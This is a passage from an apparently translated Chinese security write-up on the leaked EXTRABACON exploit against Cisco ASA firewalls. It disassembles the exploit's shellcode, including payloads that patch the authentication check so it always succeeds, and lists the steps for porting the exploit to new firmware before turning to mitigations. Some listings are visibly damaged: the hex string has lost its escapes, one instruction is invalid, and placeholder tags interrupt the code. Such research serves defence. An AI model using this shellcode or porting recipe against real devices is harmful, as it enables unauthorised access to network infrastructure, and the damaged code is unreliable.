对内存进行一个快速检查之后发现,shellcode的其他部分代码出现在了堆栈上,就像一个范例，ESP正好指向脚本中称为find的第二个片段——这个指令的反汇编结果如下所示:
    $ rasm2 -d "x8bx7cx24x14x8bx07xffxe0x90"
    mov edi, dword [esp + 0x14]
    mov eax, dword [edi]
    jmp eax
    nop
这个简单的代码间接引用了堆栈上的一个指针两次。这段代码不需要修改就可以重用，并且在我们的测试中100%可靠,我们只需要将my_ret_addr的值设置为一个修改的地址，这个地址指向9.2(4)
lina二进制文件中的jmp esp指令。第二个片段的代码也很简单:
    [源代码]
    mov eax, 0xad47cc10
    xor eax, 0xa5a5a5a5 ; EAX=8E269B5
    sub esp, 4
    mov dword [esp], eax
    mov ebp, esp
    add ebp, 0x48
    xor eax, eax
    xor ebx, ebx
    mov bl, 0x10
    xor esi, esi
    mov edi, 0xaaaaaaae
    xor edi, 0xa5a5a5a5 ; EDI=F0F0F0B
    push al
    [源代码]
    这段代码修复损坏的堆栈帧，然后将一些常量(其中一个看起来像一个代码指针)推入堆栈。在这之后,启动程序执行:
    [源代码]
    mov eax, dword [esp + 0x1e8]
    add al, 1
    call eax
    [源代码]
这几行代码从堆栈中读取一个指针,调整一下然后调用生成的地址。因为不知道我们正在寻找的是什么样的指针，所以我们上传了旧的固件，然后从0xcc操作码处开始修改相应的shellcode碎片，这触发了一个内存跳转。这样我们发现地址启动器指向我们的第一个实际载荷PMCHECK_disable。由于启动器不工作,所以我们开始在ESP附近的内存去搜寻负载的标识。我们最初使用0xa5a5a5a5模式,然后用更长的模式缩小搜索。找到负载的开始后,我们寻找堆栈上附近的值。
负载实际上由两部分组成,PMCHECK_disable和AAAADMINAUTH_disable，这两个的工作方式非常相似,所以我们现在先讨论其中的一个:
    [源代码]
    mov edi, 0xa5a5a5a5
    mov eax, 0xa5a5a5d8
    xor eax, edi        ; EAX=7D
    mov ebx, 0xacf065a5
    xor ebx, edi        ; EBX=955C000
    mov ecx, 0xa5a5b5a5
    xor ecx, edi        ; ECX=1000
    mov edx, 0xa5a5a5a2
    xor edx, edi        ; EDX=7
    int 0x80            ; SYSCALL
    jmp 0x39
    mov edi, 0x955c9f0  ; ADDRESS TO PATCH
    xor ecx, ecx
    mov cl, 4
    cld
    rep movsb byte es:[edi], byte ptr [esi] ; BUFFER COPY
    jmp 0x42
    pop esi
    jmp 0x25
    call 0x36
    xor eax, eax  ; PATCH CODE
    inc eax
    ret
    [源代码]
第一部分再次揭露了一些常量值然后触发了系统调用。EAX中的系统调用标识符按照惯例设定,我们主要做的实际上是设置一个包含0x955c9f0的可写内存页面:
    sys_mprotect(start=0x955C000, len=0x1000, prot=0x7)
幸运的是，相应的固件是公开的,提取和反汇编之后很明显就可以发现这个地址是一个负责身份验证检查的函数的入口点。然后用rep
movsb指令将Shellcode的结尾复制到这个地址,最后shellcode向前执行AAAADMINAUTH_disable的有效载荷部分,这和固件的AAA
API功能相似。这样的话，关键的身份验证检查结果将始终返回SUCCESS,导致身份验证绕过。
请注意,我们现在拥有任意的可执行代码,所以这个拼凑只是我们可以做的其中之一。不幸的是,
在ASA上用shellcode影响网络并不繁琐,所以这个解决方案似乎是合理的,既紧凑又容易在新目标上采用。
我们利用这个代码在更新的固件中查找修补功能。虽然子图同构是一个困难的问题,但是在实践中可以基于调试字符串和“独特的”代码模式来识别相同的代码部分。在IDA中匹配函数在视觉上非常相似,一旦发现就很容易认出他们。此外,有效载荷的伟大之处是,在找到匹配的入口点之后,我们只需要修改两个常数就完成了。
还记得之前提到的那个像一个代码指针的常量吗？这实际上就是我们准备利用的地址。如果我们返回去看一看原始lina的反汇编结果,我们可以看到,这个地址正好在一个函数调用之后,它可能会调用一个函数,这正是在漏洞发生的地方,之后我们可能会当做什么也没发生一样继续执行。其实移植的过程是一样的:在新版本的二进制文件中查找相同的函数,然后修改前面提到的常量地址,然后我们的漏洞利用就如期工作了。
**  
**
**总结**
总之,想要修改ASA利用使其支持一个新版本需要:
1.找到一个JMP ESP地址
2.修改堆栈偏移值
3.修改两个硬编码函数入口地址
4.修改硬编码的返回地址
步骤1、3和4通过静态分析可以自动执行。在我们的例子中步骤2需要进行一些调试,但更好的理解代码之后，可以完全自动化地生成shellcode。事实上,泄露的shellcode文件有一条注释“该文件是自动生成的”。
同样重要的是,我们在没有详细的根本原因分析,特殊的工具或源代码,只是基于泄露的代码、通过调试和简单的静态二进制分析的情况下就创建了新的利用版本。
**  
**
**检测、缓解、解决方案**
思科已经发布了一个关于EXTRABACON漏洞利用的详细博文和安全公告，确认了所有支持的版本都是易受攻击的。在撰写本文时还没有可用的补丁,供应商建议限制对SNMP接口的访问，建立一个难以猜测的社区字符串。在这些解决方法中有两点需要注意:
1.SNMP是一个基于UDP的协议,允许简单的源地址欺骗。在设计/评估网络级别的解决方法时应该牢记这一点。
2.社区字符串在网络上以纯文本的方式传输。我们不期望常见的社区字符串在短时间内消失。
这篇文章出版之前,思科已经开始对某些固件版本推出修复补丁——一定要在你的设备上进行这些修复以阻止基于EXTRABACON的攻击！随着供应商开始系统地消除漏洞,我们期望最新的补丁不仅仅包括对这个漏洞的修复。从长远来看，应用于ASA软件的最新的漏洞利用缓解技术应该为平台提供可伸缩性的保护,修复整个漏洞集合并提高攻击者的成本。